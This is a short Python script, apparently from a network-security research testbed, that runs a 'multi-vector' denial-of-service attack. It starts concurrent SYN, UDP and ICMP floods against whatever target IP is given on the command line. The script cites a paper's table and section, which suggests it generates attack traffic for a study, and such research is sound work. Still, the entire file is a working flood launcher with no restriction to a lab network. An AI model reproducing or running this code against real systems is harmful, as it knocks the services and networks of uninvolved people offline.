#!/usr/bin/env python3
"""Multi-vector DDoS from h4  (Table VII: 12% share, target CR 94%).

Concurrent SYN + UDP + ICMP trains to exhaust switch state tables with several
protocol headers at once (Sec IV.C.2 "Multi-Vector Aggregation").
"""
from __future__ import annotations
import argparse, threading
from attacks import syn_flood, udp_flood, icmp_flood


def run(target_ip: str, duration_s: float = 30.0, seed: int = 42) -> None:
    ts = [
        threading.Thread(target=syn_flood.run, args=(target_ip, duration_s, 443, seed)),
        threading.Thread(target=udp_flood.run, args=(target_ip, duration_s, 53, seed + 1)),
        threading.Thread(target=icmp_flood.run, args=(target_ip, duration_s, seed + 2)),
    ]
    for t in ts: t.start()
    for t in ts: t.join()


if __name__ == "__main__":
    a = argparse.ArgumentParser(); a.add_argument("target"); a.add_argument("--duration", type=float, default=30.0)
    a.add_argument("--seed", type=int, default=42); n = a.parse_args(); run(n.target, n.duration, seed=n.seed)
